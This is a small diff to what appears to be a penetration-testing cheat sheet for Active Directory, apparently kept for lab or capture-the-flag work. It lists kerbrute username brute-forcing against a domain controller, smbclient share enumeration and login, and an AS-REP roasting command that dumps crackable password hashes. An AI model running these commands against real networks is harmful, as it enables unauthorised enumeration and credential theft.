@@ -10,8 +10,9 @@
 ### Brute-force users on Domain
 - `kerbrute userenum -d $DOMAIN.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt — dc $IP`
 
-### Enumerate shares
-- `smbclient -L \\\\$IP -N`
+### SAMBA
+- `smbclient -L \\\\$IP -N` Enumerate
+- `smbclient \\\\$IP/SHARE` login to share
 
 ### Get Hashes
 - `GetNPUsers.py '$DOMAIN' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip $IP`
